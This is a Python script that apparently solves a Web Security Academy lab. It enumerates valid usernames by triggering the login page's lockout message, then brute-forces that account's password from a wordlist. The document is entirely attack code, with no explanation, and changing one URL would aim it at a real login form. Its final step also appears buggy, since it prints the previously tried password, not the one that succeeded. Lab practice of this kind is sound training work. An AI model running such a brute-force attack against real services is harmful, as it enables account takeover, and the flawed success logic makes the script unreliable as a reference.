import requests
from tqdm import tqdm
url = 'https://0a26002504a02003c20509c9001800cc.web-security-academy.net/login'

#Step 1:
usernames = open('../shortlist/usernames.txt', 'r').read().splitlines()
usernameValid = ''
for username in tqdm(usernames):
    for i in range(5):
        data = {
            'username': username,
            'password': 'password'
        }
        response = requests.post(url, data=data)
        
        if 'too many incorrect login' in response.text:
            usernameValid = username
            print(username)
            break
    if usernameValid != '':
        break
#Step 2:
passwords = open('../shortlist/passwords.txt', 'r').read().splitlines()
passwordValid = ''
for password in tqdm(passwords):
    data = {
        'username': usernameValid,
        'password': password
    }
    
    response = requests.post(url, data=data)
    if 'Invalid username or password' in response.text or 'too many incorrect login' in response.text:
        passwordValid = password
        continue
    else:
        print(passwordValid)
        break
